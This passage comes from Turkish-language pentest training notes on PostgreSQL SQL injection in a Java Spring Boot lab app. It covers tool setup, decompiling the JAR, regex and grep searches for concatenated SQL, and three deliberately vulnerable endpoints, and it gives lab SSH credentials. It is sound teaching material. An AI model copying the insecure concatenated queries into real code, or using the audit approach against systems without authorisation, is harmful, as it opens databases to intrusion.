---
{"dg-publish":true,"permalink":"/web-pentest-expert/advanced-sql-injections/","created":"2024-12-16T05:07:16.846+03:00","updated":"2025-06-04T12:07:37.248+03:00"}
---

# Introduction to PostgreSQL

## Introduction

Bu konu, SQL enjeksiyonu ve PostgreSQL'e özgü saldırı tekniklerini whitebox  yaklaşımıyla ele alır ve SQL syntax'ı, SQL injection'ları ve Python3 bilgisi gerektirir. Modül PostgreSQL'e odaklansa da, teknikler diğer SQL varyantlarıyla da uygulanabilir.


## PostgreSQL ile etkileşim

Injection güvenlik açıklarına geçmeden önce, PostgreSQL veritabanlarıyla etkileşim kurmak için kullanılan en yaygın iki aracı tanımak için biraz zaman ayıralım: [psql](https://www.postgresql.org/docs/current/app-psql.html) ve [pgAdmin4](https://www.pgadmin.org/).


#### psql (PostgreSQL Etkileşimli Terminal)

psql, PostgreSQL veritabanlarıyla etkileşim kurmak için PostgreSQL sunucusuyla önceden paketlenmiş olarak gelen ve Linux veya Windows üzerinde çalışan bir `command-line` aracıdır.

Bir Linux dağıtımına psql'i bu tek komutla kurabilirsiniz:

```
sudo apt install postgresql-client-15
```

Alternatif :

```
sudo apt install postgresql-client
```

Not: Çalıştırdığınız Linux dağıtımında sürüm 15 bulunmuyor olabilir. Bu durumda, sürüm 13'ü yükleyebilirsiniz ve her şey minimum uyarlanmış adımlarla iyi çalışacaktır.

Windows'a psql yüklemek için öncelikle postgresql.org adresinden [PostgreSQL](https://www.postgresql.org/download/windows/) yükleyicisini indirmeli ve ardından yükleme işlemi sırasında Command Line Tools dışındaki her şeyin seçimini kaldırmalısınız.

![Pasted image 20241216051138.png](/img/user/resimler/Pasted%20image%2020241216051138.png)

Kurulum tamamlandıktan sonra, `psql.exe` dosyasını kurulum dizininden (varsayılan olarak `C:\Program Files\PostgreSQL\15\bin`) kullanabilir veya herhangi bir yerden kullanabilmek için dizini sistem `PATH` değişkenine ekleyebilirsiniz:

![Pasted image 20250428113122.png](/img/user/resimler/Pasted%20image%2020250428113122.png)

Seçtiğiniz işletim sistemine `psql`'i kurduktan sonra, aşağıdaki komutla bir PostgreSQL veritabanına bağlanabilirsiniz:

![Pasted image 20250428114032.png](/img/user/resimler/Pasted%20image%2020250428114032.png)

Bağlandıktan sonra, veritabanlarını `\l` komutuyla veya daha fazla ayrıntı için `\l+` komutuyla listeleyebilirsiniz.

```shell-session
acmecorp=> \l
```

|Name|Owner|Encoding|Collate|Ctype|ICU Locale|Locale Provider|Access privileges|
|---|---|---|---|---|---|---|---|
|acmecorp|postgres|UTF8|C.UTF-8|C.UTF-8||libc||
|postgres|postgres|UTF8|C.UTF-8|C.UTF-8||libc||
|template0|postgres|UTF8|C.UTF-8|C.UTF-8||libc|=c/postgres + postgres=CTc/postgres|
|template1|postgres|UTF8|C.UTF-8|C.UTF-8||libc|=c/postgres + postgres=CTc/postgres|

![Pasted image 20250428114101.png](/img/user/resimler/Pasted%20image%2020250428114101.png)

Bir veritabanına geçmek için `\c <VERİTABANI>` komutunu kullanabilirsiniz. Bu durumda zaten `acmecorp` veritabanındayız. (Benim için `postgres`)

Bir veritabanındaki tabloları listelemek için (veritabanına geçtikten sonra) `\dt` komutunu veya genişletilmiş bilgi için `\dt+` komutunu kullanabilirsiniz.


```shell-session
acmecorp=> \dt+
```

|Schema|Name|Type|Owner|Persistence|Access method|Size|Description|
|---|---|---|---|---|---|---|---|
|public|departments|table|postgres|permanent|heap|8192 bytes||
|public|dept_emp|table|postgres|permanent|heap|72 kB||
|public|employees|table|postgres|permanent|heap|176 kB||
|public|salaries|table|postgres|permanent|heap|72 kB||
|public|titles|table|postgres|permanent|heap|80 kB||

Son olarak, veritabanını sorgulamak için sorguyu girip noktalı virgülle (`;`) sonlandırmanız yeterlidir. Çok satırlı sorgular da çalışır.

```shell-session
acmecorp=> SELECT first_name, last_name, email FROM employees LIMIT 5;
```

| first_name | last_name   | email                          |
| ---------- | ----------- | ------------------------------ |
| Kathleen   | Flint       | `kathleen.flint@email.com`     |
| Henry      | Watson      | `henry.watson@email.com`       |
| Ruth       | Perez       | `ruth.perez@email.com`         |
| Leon       | Tappin      | `leon.tappin@email.com`        |
| Donita     | Fairweather | `donita.fairweather@email.com` |

#### pgAdmin4

pgAdmin4, `Linux` ve `Windows` üzerinde çalışan PostgreSQL veritabanları ile etkileşim için bir `GUI` uygulamasıdır.

Linux üzerinde `pgAdmin4`'ü kurmak için aşağıdaki komutları çalıştırın:

```shell-session
[!bash!]$ curl -fsS https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo gpg --dearmor -o /usr/share/keyrings/packages-pgadmin-org.gpg

[!bash!]$ sudo sh -c 'echo "deb [signed-by=/usr/share/keyrings/packages-pgadmin-org.gpg] https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main" > /etc/apt/sources.list.d/pgadmin4.list && apt update'

[!bash!]$ sudo apt install pgadmin4
```

Not: `Kali` veya `ParrotOS`  kullanıyorsanız, ikinci komuttaki `$(lsb_release -cs)` ifadesini `bullseye` ile değiştirmek gerekir, aksi takdirde kurulum başarısız olur.

`Windows`'a `pgAdmin4` yüklemek için pgadmin.org adresinden yükleyiciyi indirebilir ve yükleme adımlarını takip edebilirsiniz ya da `psql.exe`'yi yüklemek için kullandığımız yükleyiciyi tekrar kullanabilirsiniz, sadece yükleme işleminde bu kez `pgAdmin4` seçeneğinin işaretli olduğundan emin olun.

`pgAdmin4`'ü ilk kez başlattığınızda bir master password belirlemeniz gerekecektir. Bu sadece daha sonra veritabanlarına bağlanmak için kullanacağınız kimlik bilgilerini korumak içindir.

![Pasted image 20250428115257.png](/img/user/resimler/Pasted%20image%2020250428115257.png)

Bir `PostgreSQL` sunucusuna bağlanmak için `Dashboard > Add New Server`'a gidin, ayrıntıları doldurun ve `Save`'e basın.

![Pasted image 20250428115405.png](/img/user/resimler/Pasted%20image%2020250428115405.png)

Bunu yaptıktan sonra, sol taraftaki `server`'a seçtiğiniz adla erişebilirsiniz. Veritabanlarını ve tabloları görüntülemek bu grafik arayüzle çok sezgiseldir ve sorguları çalıştırmak bir veritabanına `sağ tıklayıp Query Tool`'u seçmek kadar basittir.

![Pasted image 20250428115511.png](/img/user/resimler/Pasted%20image%2020250428115511.png)

# Decompiling Java Archives

## Introduction

Veritabanı olarak `PostgreSQL` kullanan bir [Java Spring Boot](https://spring.io/) web uygulaması olan `BlueBird` adlı bir hedef uygulama üzerinde `white-box` güvenlik değerlendirmesi yapmak üzere görevlendirildiğimizi düşünün.

![Pasted image 20250428124048.png](/img/user/resimler/Pasted%20image%2020250428124048.png)

`BlueBird`'ün kaynak koduna erişimimiz yok, ancak Java'ya aşina değilseniz, esasen bir Java çalıştırılabilir dosyası olan derlenmiş [JAR](https://en.wikipedia.org/wiki/JAR_(file_format)) dosyasına erişimimiz vardı. `BlueBird`'ün kaynak kodunu `JAR` dosyasından derlemek ve almak için kullanabileceğimiz iki araca bir göz atalım, böylece güvenlik açıklarını aramaya başlayabiliriz.

Not: Makinenizde Java yüklü olduğu varsayılmaktadır. Henüz sahip değilseniz, [OpenJDK.org](https://openjdk.org/) adresine gidin ve en son sürümü yükleyin.

#### Testing VM

Bu modül sırasında BlueBird JAR dosyası, Java yüklü ve PostgreSQL yüklü ve başlatılmış olan bir `test sanal makinesine` erişiminiz olacaktır.

SSH üzerinden `student` kullanıcı adı ve `academy.hackthebox.com` şifresini kullanarak bağlanabilirsiniz.

BlueBird uygulama dosyaları `/opt/bluebird` dizininde ve PostgreSQL log dosyalarında bulunur (daha sonraki bölümde daha ayrıntılı bilgi verilecektir).

```shell-session
[!bash!]$ /opt/bluebird$ ls -lah
total 45M
drwxr-xr-x 3 root root 4.0K Feb 28 15:07 .
drwxr-xr-x 3 root root 4.0K Feb 28 11:22 ..
-rwxr-xr-x 1 root root  45M Feb 28 11:24 BlueBird-0.0.1-SNAPSHOT.jar
drwxrwxrwx 2 root root 4.0K Feb 28 15:19 pg_log
-rwxr-xr-x 1 root root  319 Feb 28 11:35 serverInfo.sh
```

Ayrıca `/opt` içinde `Pass2-1.0.3-SNAPSHOT.jar` dosyasını içeren `Pass2` adlı bir klasör bulunmaktadır. Bunu indirebilirsiniz, ancak şimdilik görmezden gelin, beceri değerlendirmesinde kullanılacaktır.

`Student` kullanıcı aşağıdaki komutları `sudo` ile çalıştırabilir, böylece gerekirse servisleri yeniden başlatabilirsiniz.

```shell-session
!bash!]$ sudo -l
Matching Defaults entries for student on bb01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User student may run the following commands on bb01:
    (ALL) NOPASSWD: /usr/bin/systemctl start bluebird
    (ALL) NOPASSWD: /usr/bin/systemctl stop bluebird
    (ALL) NOPASSWD: /usr/bin/systemctl start postgresql
    (ALL) NOPASSWD: /usr/bin/systemctl stop postgresql
```

## Fernflower

[Fernflower](https://github.com/JetBrains/intellij-community/tree/master/plugins/java-decompiler/engine), [JetBrains](https://www.jetbrains.com/) tarafından sürdürülen ve [IntelliJ IDEA](https://www.jetbrains.com/idea/) IDE'ye dahil edilen açık kaynaklı bir Java derleyicisidir. Bu aracı kullanmak için öncelikle derlememiz gerekir.

[Resmi repository](https://github.com/JetBrains/intellij-community/tree/master/plugins/java-decompiler/engine)'deki tüm istenmeyen/ekstra dosyaları indirmekten kaçınmak için, Fernflower'ı içeren belirli klasörün resmi olmayan bir mirror'ını klonlayabiliriz:

- [github.com/fesh0r/fernflower](https://github.com/fesh0r/fernflower)
- [github.com/MinecraftForge/FernFlower](https://github.com/MinecraftForge/FernFlower)

Şimdi bunlardan birini seçelim ve klonlayalım:

```shell-session
[!bash!]$ git clone https://github.com/fesh0r/fernflower.git
Cloning into 'fernflower'...
remote: Enumerating objects: 12680, done.
remote: Counting objects: 100% (2795/2795), done.
remote: Compressing objects: 100% (859/859), done.
remote: Total 12680 (delta 1435), reused 2541 (delta 1297), pack-reused 9885
Receiving objects: 100% (12680/12680), 6.39 MiB | 1.84 MiB/s, done.
Resolving deltas: 100% (7209/7209), done.
```

Repository klonlandıktan sonra, dizinine girin ve `Fernflower`'ı derlemek için [Gradle](https://gradle.org/)'ı kullanın.

```shell-session
[!bash!]$ ./gradlew build
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Welcome to Gradle 7.5.1!

Here are the highlights of this release:
 - Support for Java 18
 - Support for building with Groovy 4
 - Much more responsive continuous builds
 - Improved diagnostics for dependency resolution

For more details see https://docs.gradle.org/7.5.1/release-notes.html

Starting a Gradle Daemon (subsequent builds will be faster)

> Task :test
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

BUILD SUCCESSFUL in 20s
4 actionable tasks: 4 executed
```

Sistemdeki `JDK` sürümü `Fernflower`'ı geliştirmek için kullanılan sürümle (özellikle `JDK 17`) eşleştiği için `Gradle` `Fernflower`'ı başarıyla derleyebildi, ancak `JDK` sürümü eşleşmeyen bir makinede derlemeye çalıştığımızda aşağıdaki hatayı alacağız:

```shell-session
[!bash!]$ ./gradlew build

Downloading https://services.gradle.org/distributions/gradle-7.5.1-bin.zip

<SNIP>

Starting a Gradle Daemon (subsequent builds will be faster)
> Task :compileJava FAILED

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':compileJava'.
> error: invalid source release: 17

* Try:
> Run with --stacktrace option to get the stack trace.
> Run with --info or --debug option to get more log output.
> Run with --scan to get full insights.

* Get more help at https://help.gradle.org

BUILD FAILED in 15s
1 actionable task: 1 executed
```

Bu sorunu çözmek için `apt` kullanarak `openjdk-17-jdk` yüklememiz gerekiyor:

```shell-session
[!bash!]$ sudo apt install openjdk-17-jdk

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libgit2-1.1 libmbedcrypto3 libmbedtls12 libmbedx509-0 libstd-rust-1.48 libstd-rust-dev linux-kbuild-5.18 rust-gdb
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  openjdk-17-jdk-headless openjdk-17-jre openjdk-17-jre-headless
Suggested packages:
  openjdk-17-demo openjdk-17-source visualvm fonts-ipafont-gothic fonts-ipafont-mincho fonts-wqy-microhei | fonts-wqy-zenhei fonts-indic
The following NEW packages will be installed:
  openjdk-17-jdk openjdk-17-jdk-headless
The following packages will be upgraded:
  openjdk-17-jre openjdk-17-jre-headless
2 upgraded, 2 newly installed, 0 to remove and 106 not upgraded.
Need to get 278 MB of archives.
After this operation, 244 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y

<SNIP>
```

Daha sonra, bunu sistemimiz için varsayılan JDK olarak ayarlamamız gerekir, bunu yapmak için önce `--list` bayrağıyla birlikte `update-java-alternative` kullanarak `JDK 17`'nin yolunu bilmemiz gerekir:

```shell-session
[!bash!]$ sudo update-java-alternatives --list

java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.13.0-openjdk-amd64      1311       /usr/lib/jvm/java-1.13.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
```

Path `/usr/lib/jvm/java-1.17.0-openjdk-amd64`'tür, bu nedenle şimdi `--set` bayrağıyla birlikte `update-java-alternative` ile varsayılan olarak ayarlamamız gerekir:

```shell-session
[!bash!]$ sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
```

`Fernflower`'ı tekrar derlemeye çalıştığımızda, sorun çözüldüğü için hatanın kaybolduğunu fark edeceğiz.

`Gradle` tamamlandığında, `Fernflower` `build/libs/fernflower.jar` adresinde bulunan bir `JAR` dosyasına derlenmiş olmalıdır. `BlueBird`'ü bu şekilde derlemek için bunu kullanabiliriz (out'un gerçek bir klasör olduğundan emin olun):

```shell-session
[!bash!]$ java -jar fernflower.jar BlueBird-0.0.1-SNAPSHOT.jar out
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
INFO:  Decompiling class org/springframework/boot/loader/ClassPathIndexFile
INFO:  ... done
INFO:  Decompiling class org/springframework/boot/loader/ExecutableArchiveLauncher
<SNIP>
INFO:  Decompiling class com/bmdyy/bluebird/model/Post
INFO:  ... done
INFO:  Decompiling class com/bmdyy/bluebird/model/User
INFO:  ... done
```

`Fernflower` tamamlandığında, `çıkış (out)` yapabiliriz ve içinde bir dizi kaynak .java dosyasını barındıran tek bir JAR dosyasına sahip olmalıyız. Bunları çıkarmak için aşağıdaki komutu kullanabiliriz:

```shell-session
[!bash!]$ jar -xf BlueBird-0.0.1-SNAPSHOT.jar 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Bu noktada, `BOOT-INF/classes` dizini içinde kaynak `.java` dosyalarına sahip olmalıyız.

```shell-session
[!bash!]$ tree
.
├── BlueBird-0.0.1-SNAPSHOT.jar
├── BOOT-INF
│   ├── classes
│   │   ├── application.properties
│   │   ├── com
│   │   │   └── bmdyy
│   │   │       └── bluebird
│   │   │           ├── BlueBirdApplication.java
│   │   │           ├── controller
│   │   │           │   ├── AuthController.java
│   │   │           │   ├── IndexController.java
│   │   │           │   ├── PostController.java
│   │   │           │   ├── ProfileController.java
│   │   │           │   └── ServerInfoController.java
│   │   │           ├── model
│   │   │           │   ├── Post.java
│   │   │           │   └── User.java
│   │   │           └── security
│   │   │               ├── jwt
│   │   │               │   ├── AuthEntryPointJwt.java
│   │   │               │   ├── AuthTokenFilter.java
│   │   │               │   └── JwtUtils.java
│   │   │               ├── services
│   │   │               │   ├── UserDetailsImpl.java
│   │   │               │   └── UserDetailsServiceImpl.java
│   │   │               └── WebSecurityConfig.java
│   │   ├── static
│   │   │   └── css
│   │   │       └── styles.css
│   │   └── templates
│   │       ├── edit-profile.html
│   │       ├── error.html
│   │       ├── find-user.html
│   │       ├── forgot.html
│   │       ├── home-logged-in.html
│   │       ├── home-logged-out.html
│   │       ├── login.html
│   │       ├── profile.html
│   │       ├── reset.html
│   │       ├── server-info.html
│   │       └── signup.html
│   ├── classpath.idx
│   ├── layers.idx
│   └── lib
<SNIP>
25 directories, 136 files
```

## JD-GUI

`JAR` dosyalarını derlemek için kullanabileceğimiz bir başka açık kaynak aracı da [JD-GUI](https://github.com/java-decompiler/jd-gui)'dir. Adından da anlaşılacağı gibi, bu, derlenmiş dosyaları görüntülemek için kullanabileceğimiz bir grafik arayüze sahiptir. İyi çalışıyor, ancak son sürüm 2019'daydı ve proje durdurulmuş bile olabilir.

En son sürüm `JAR` dosyasını [buradan](https://github.com/java-decompiler/jd-gui/releases) indirebilir ve şu şekilde çalıştırabiliriz:

```shell-session
[!bash!]$ java -jar jd-gui-1.6.6.jar BlueBird-0.0.1-SNAPSHOT.jar 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

![Pasted image 20250428130946.png](/img/user/resimler/Pasted%20image%2020250428130946.png)

`.java` kaynak dosyalarını görüntülemek ve hatta stringleri, değişkenleri veya methodları aramak için UI'yi kullanabiliriz. Alternatif olarak, kaynak koduna bakmak için [Visual Studio Code](https://code.visualstudio.com/) kullanılabilir. `File > Save All Sources`'a basarak ve ardından oluşturulan `ZIP` arşivini açarak kaynak dosyaları kaydedebilirsiniz.


# Searching for Strings

## RegEx

Artık `BlueBird` için derlenmiş kaynak dosyalara sahip olduğumuza göre güvenlik açıklarını aramaya başlayabiliriz; bu durumda özellikle `SQL enjeksiyonu` güvenlik açıklarıyla ilgileniyoruz.

Çoğu durumda, `SQL sorguları` basitçe işlenmek üzere bir veritabanına aktarılan `stringlerdir`. `SQL enjeksiyonu` güvenlik açıklarını tespit etmek istediğimiz durumda, programda kullanılan `SQL sorgularını` analiz ederek herhangi birinin güvenlik açığı olup olmadığını görmek gerekir. Kod satırları arasında manuel olarak gezinmek yerine, çabalarımızı önemli ölçüde hızlandırmak için `Regular Expressions (RegEx)` kullanabiliriz.

Aşağıdaki tabloda kullanabileceğimiz birkaç `RegEx` kalıbı bulunmaktadır.

| Query                                                 | Description                                                                                                                                                                                       |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SELECT\|UPDATE\|DELETE\|INSERT\|CREATE\|ALTER\|DROP` | Temel SQL komutlarını arayın. Enjeksiyon sadece SELECT ifadelerinde değil, başka komutlarda da meydana gelebilir, ancak istismar biraz daha zorlayıcı olabilir.                                   |
| `(WHERE\|VALUES).*?'`                                 | `WHERE` veya `VALUES` içeren ve ardından bir `tek tırnak` bulunan stringleri arayın, bu da bir string birleştirmesini gösterebilir.                                                               |
| `(WHERE\|VALUES).*" \+`                               | `WHERE` veya `VALUES` içeren ve ardından bir çift tırnak ve artı işareti gelen dizeleri arayın, bu da bir string birleştirmesini gösterebilir.                                                    |
| `.*sql.*"`                                            | `sql` içeren ve ardından bir `çift tırnak` bulunan satırları arayın.                                                                                                                              |
| `jdbcTemplate`                                        | `jdbcTemplate` içeren satırları arayın. `Java`'da `SQL` veritabanlarıyla etkileşimde bulunmanın çeşitli yolları vardır. `JdbcTemplate` bunlardan biridir; diğerleri ise `JPA` ve `Hibernate`'dir. |

Kaynak kodu analiz ederken, `kullanılan kütüphaneleri` ve `kodlama stilini` not almak faydalıdır, böylece arama sorgularınızı daha etkili hale getirebilirsiniz. Örneğin, `BlueBird`'deki sonuçları incelediğimizde, geliştiricinin SQL sorgularını her zaman `sql` adında bir değişkende sakladığını fark edeceğiz, bu yüzden bunu özellikle arayabiliriz.

## Grep

Bu RegEx kalıplarını derlenmiş kaynak dosyalara karşı kullanabilmemizin bir yolu, dosyalardaki kalıpları aramak için kullanılan bir komut satırı aracı olan [grep](https://man7.org/linux/man-pages/man1/grep.1.html)'tir.

RegEx'i grep ile kullanmak için sözdizimi `grep -E <RegEx> <File>` şeklindedir, ancak sonuçlarımızı iyileştirmek için yalnızca `.java` dosyalarındaki eşleşmeleri aramak için `--include *.java`, satır numaralarını görüntülemek için `-n`, büyük küçük harfleri yok saymak için `-i` ve bir dizinde recursively olarak aramak için `-r` gibi birkaç argüman daha ayarlayabiliriz.

Sonuç olarak, kullanmak istediğimiz komut aşağıdaki gibi görünecektir:

```shell-session
[!bash!]$ grep -irnE 'SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP' .
./com/bmdyy/bluebird/controller/PostController.java:21:    public void createPost(@RequestParam String text, HttpServletResponse response) throws IOException {
./com/bmdyy/bluebird/controller/PostController.java:25:            String sql = "INSERT INTO posts (text, author_id, posted_at) VALUES (?, ?, CURRENT_TIMESTAMP);";
./com/bmdyy/bluebird/controller/PostController.java:26:            jdbcTemplate.update(sql, text, userDetails.getId());
./com/bmdyy/bluebird/controller/AuthController.java:78:        String sql = "SELECT * FROM users WHERE id = ?";
<SNIP>
./com/bmdyy/bluebird/controller/ProfileController.java:109:        response.sendRedirect("/profile/edit?e=Details+updated!");
./com/bmdyy/bluebird/security/services/UserDetailsServiceImpl.java:21:            String sql = "SELECT * FROM users WHERE username = ?";
```

## Visual Studio Code

Bu `RegEx` kalıplarını kullanmanın daha görsel bir başka yolu da Visual Studio Code'dur. Sol taraftaki `büyütece` tıklayarak, `RegEx` kalıbını girerek ve ardından `RegEx` aramasını etkinleştirmek için en sağdaki düğmeye tıklayarak `Search` özelliğini kullanabiliriz.

![Pasted image 20250428132400.png](/img/user/resimler/Pasted%20image%2020250428132400.png)

## Results

Bu yöntemlerden birini kullanarak SQL sorgularını kullanan fonksiyonları hızlı bir şekilde belirleyebiliriz. Daha sonra bunları gözden geçirerek input sanitizasyonundan yoksun olanları belirlemeye çalışabiliriz.


#### Identifying the SQL Injection in /find-user

`grep` kullanarak `IndexController.java`'da aşağıdaki string birleşimini tespit edebiliriz:

![Pasted image 20250428132704.png](/img/user/resimler/Pasted%20image%2020250428132704.png)

Koda daha yakından baktığımızda, `/find-user`'e `GET` istekleri ile eşlenen `findUser` fonksiyonunu görebiliyoruz. Bu fonksiyon, bir `u` parametresi alır. Eğer bu parametre, `p` değişkeninde bulunan RegEx desenine uyuyorsa veya bir boşluk içeriyorsa, "`Illegal Search term`" (Yasadışı Arama Terimi) hata mesajı döndürülür; aksi takdirde `u`, kullanıcıları listeleyen ve ardından `find-user` render edilirken model özelliği olarak kullanılan bir SQL sorgusunda kullanılır.

![Pasted image 20250428133153.png](/img/user/resimler/Pasted%20image%2020250428133153.png)

`resources/templates/find-user.html` dosyasına baktığımızda, `users` özelliği ile ne olduğunu görebiliyoruz; [Thymeleaf](https://www.thymeleaf.org/), listeyi döngüye alır ve `user` objesinin `Id`, `Name`, `Username` ve `Description` değerlerini yazdırır.

![Pasted image 20250428133412.png](/img/user/resimler/Pasted%20image%2020250428133412.png)

Bu açık bir SQL enjeksiyonu açığı olduğu için bunu daha sonra incelemek isteyeceğiz.

#### Identifying the SQL Injection in /forgot

Yine `grep` kullanarak, `AuthController.java`'da kullanıcı input'unun bir SQL sorgusuyla birleştirildiği aşağıdaki satıra rastlıyoruz.

```shell-session
[!bash!]$ grep -nrE '(WHERE|VALUES).*" +' .
./controller/AuthController.java:134:               String sql = "SELECT * FROM users WHERE email = '" + email + "'";
<SNIP>
```

`AuthController.java` dosyasını açtığımızda, bu satırın `/forgot` adresine `POST` isteklerini işleyen `forgotPOST()` fonksiyonunda yer aldığını ve e-posta değişkeninin sorguda kullanılmadan önce bir `RegEx` modeline karşı doğrulanan kullanıcı inputu (`@RequestParam String email`) olduğunu görebiliriz.

```java
// AuthController.java (Lines 121-164)

@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletRequest request, HttpServletResponse response) throws IOException {
    if (email.isEmpty()) {
        response.sendRedirect("/forgot?e=Please+fill+out+all+fields");
        return null;
    } else {
        Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
        Matcher m = p.matcher(email);
        if (!m.matches()) {
        response.sendRedirect("/forgot?e=Invalid+email!");
        return null;
        } else {
        try {
            String sql = "SELECT * FROM users WHERE email = '" + email + "'";
            User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
            Long var10000 = user.getId();
            String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
            var10000 = user.getId();
            String passwordResetLink = "https://bluebird.htb/reset?uid=" + var10000 + "&code=" + passwordResetHash;
            logger.error("TODO- Send email with link [" + passwordResetLink + "]");
            response.sendRedirect("/forgot?e=Please+check+your+email+for+the+password+reset+link");
            return null;
        } catch (EmptyResultDataAccessException var11) {
            response.sendRedirect("/forgot?e=Email+does+not+exist");
            return null;
        } catch (Exception var12) {
            String ipAddress = request.getHeader("X-FORWARDED-FOR");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }

            if (ipAddress.equals("127.0.1.1")) {
                model.addAttribute("errorMsg", var12.getMessage());
                model.addAttribute("errorStackTrace", Arrays.toString(var12.getStackTrace()));
            } else {
                model.addAttribute("errorMsg", "500 Internal Server Error");
                model.addAttribute("errorStackTrace", "Something happened on our side. Please try again later.");
            }

            return "error";
        }
        }
    }
}
```

Not: `Controller`'ların ne olduğunu bilmiyorsanız, onları API endpoint'leri olarak düşünebilirsiniz.

SQL hataları söz konusu olduğunda `Spring` hata mesajlarını `STDOUT`'a yazar, ancak bu durumda explicit exception handling'in tanımlandığını görebiliriz. Çoğu durumda sunucudan tipik bir `500 Internal Server Error` yanıtı alırız, ancak client IP adresimiz `127.0.1.1` ile eşleşiyorsa `Thymeleaf` template'e bir stacktrace aktarılmış gibi görünür.

SQL hata çıktısı çok faydalı olabileceğinden, bu daha sonra incelemek isteyeceğimiz bir konudur.

#### Identifying the SQL injection in /profile

`RegEx` kalıplarından bir diğerini `grep` ile kullanarak aşağıdaki SQL sorgusuyla karşılaşırız. Bu durumda `user.getEmail()` sorguda güvenli olmayan bir şekilde kullanılmaktadır, ancak bu fonksiyonun döndürdüğü değerin ne olduğunu ve daha da önemlisi bunu manipüle edip edemeyeceğimizi görmek için daha yakından bakmamız gerekir.

```shell-session
[!bash!]$ grep -nrE '.*sql.*"' .
<SNIP>
./BOOT-INF/classes/com/bmdyy/bluebird/controller/ProfileController.java:40:      sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
<SNIP>
```

`ProfileController.java` dosyasına baktığımızda, bu satırın `/profile/{id}` adresine GET istekleriyle eşlenen `profile()` fonksiyonu içinde olduğunu görüyoruz.

```java
// ProfileController.java (Lines 28-47)

@GetMapping({"/profile/{id}"})
public String profile(@PathVariable int id, Model model, HttpServletResponse response) throws IOException {
    String sql;
    User user;
    try {
        sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
        user = (User)this.jdbcTemplate.queryForObject(sql, new Object[]{id}, new BeanPropertyRowMapper(User.class));
    } catch (Exception var8) {
        response.sendRedirect("/");
        return null;
    }

    sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
    List posts = this.jdbcTemplate.queryForList(sql);
    model.addAttribute("user", user);
    model.addAttribute("posts", posts);
    UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    model.addAttribute("userDetails", userDetails);
    return "profile";
}
```

Bu koda hızlıca baktığımızda, savunmasız SQL sorgusunda referans verilen `User` objesinin, başka bir sorgudan gelen sonuçlarla hemen üstte başlatıldığını görebiliyoruz. Eğer bu sonuçları etkilemenin bir yolunu bulabilirsek, bu bizim için iyi bir haber. Bu yüzden bunu daha sonra daha yakından inceleyeceğiz.

# Live-Debugging Java Applications

## Introduction

JAR dosyasına sahip olduğumuzdan, [Visual Studio Code](https://code.visualstudio.com/) veya [Eclipse IDE](https://www.eclipse.org/)'yi kullanarak uygulamada remote debug yapabilir ve inputumuzun gerçek real-time olarak nasıl işlendiğini görebiliriz.

## Remote Debugging with Visual Studio Code

Yapmak istediğimiz ilk şey, `VSCode` için [Java Extension Pack](https://marketplace.visualstudio.com/items?itemName=vscjava.vscode-java-pack)' ini yüklemektir.

Bu kurulduktan sonra, `Fernflower`'ı kullanarak `BlueBird`'ü (henüz yapmadıysanız) derlemeden çıkaracağız. Bir hatırlatma olarak, komutlar şöyle görünür:

```shell-session
[!bash!]$ mkdir src
[!bash!]$ java -jar fernflower.jar BlueBird-0.0.1-SNAPSHOT.jar src
[!bash!]$ cd src
[!bash!]$ jar -xf BlueBird-0.0.1-SNAPSHOT.jar
```

Bu noktada, `VSCode`'u açıp `src/BOOT-INF/classes` klasörünü açabiliriz. Tüm kaynak dosyalar açık olmalı, ancak çözümlenememiş importlar nedeniyle birçok satır kırmızıyla altı çizili görünecek. Bunu düzeltmek için sol kenar çubuğundan **`Java Projects > Referenced Libraries`** bölümüne gidip, **+** simgesine tıklayarak decompile edilmiş `src/BOOT-INF/libs` klasöründeki tüm `JAR` dosyalarını seçmeliyiz. Bu işlem tamamlandıktan sonra hatalar kaybolacaktır.

![Pasted image 20250428135224.png](/img/user/resimler/Pasted%20image%2020250428135224.png)

Şimdi, debug bölmesini açmak için `[CTRL]+[SHIFT]+[D]` tuşlarına basmak ve aşağıdaki içeriğe sahip bir `launch.json` dosyası oluşturmak istiyoruz:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "type": "java",
            "name": "Remote Debugging",
            "request": "attach",
